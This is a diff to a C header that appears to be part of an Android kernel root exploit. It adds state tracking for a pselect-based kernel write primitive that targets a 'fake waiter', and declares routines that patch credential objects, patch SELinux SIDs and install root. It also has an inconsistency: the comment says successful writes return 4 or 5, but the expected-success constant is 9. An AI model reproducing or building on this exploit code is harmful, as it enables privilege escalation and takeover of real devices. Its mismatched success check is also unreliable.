@@ -152,6 +152,9 @@
 #define SLIDE_PSELECT_TIMEOUT_SEC 1
 #define SLIDE_WAIT_SECONDS 2
 #define PSELECT_WRITE_SHAPE_DEFAULT 1
+/* Nominal select() return for a landed PI route. Measured on PLG110: misses
+ * return 3, landed writes return 4 or 5 — see pselect_route_landed(). */
+#define PSELECT_EXPECTED_READY 9
 #define ROUTE_WAIT_SECONDS 1
 #define EARLY_PIPE_PREPARE 0
 #define SLIDE_NFULNL_LOGGER \
@@ -279,6 +282,18 @@ extern int pipe_stage_attempts;
 extern int cfi_dirty_seen;
 extern int cfi_last_step;
 extern int cfi_last_errno;
+/* Last select() outcome of the PI route. ret==PSELECT_EXPECTED_READY means the
+ * kernel wrote back into the caller's fd_set, i.e. the fake waiter was reached;
+ * ret==3 means the overlay missed and the write made during that attempt was
+ * dropped. route_last_loops counts attempts so a caller can tell "never ran"
+ * apart from "ran and failed". */
+extern int route_last_ret;
+extern int route_last_errno;
+extern int route_last_calls;
+extern int route_last_success;
+extern int route_last_loops;
+/* True only when the most recent attempt actually reached the waiter. */
+int pselect_route_landed(void);
 extern uint64_t kmalloc_pipe_cache;
 extern uint64_t kmalloc_normal_1k_cache;
 extern uint64_t kmalloc_normal_2k_cache;
@@ -516,6 +531,10 @@ int patch_cred_sid(int fd, uintptr_t cred);
 int patch_cred_object(int fd, uintptr_t cred);
 int install_android_root(int fd);
 
-#endif
+/* Must be last: rebinds every per-device symbol/struct offset macro to the
+ * runtime offsets table, and its fallbacks reference macros defined above. */
+#include "runtime_struct_offsets.h"
 
 void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
+
+#endif
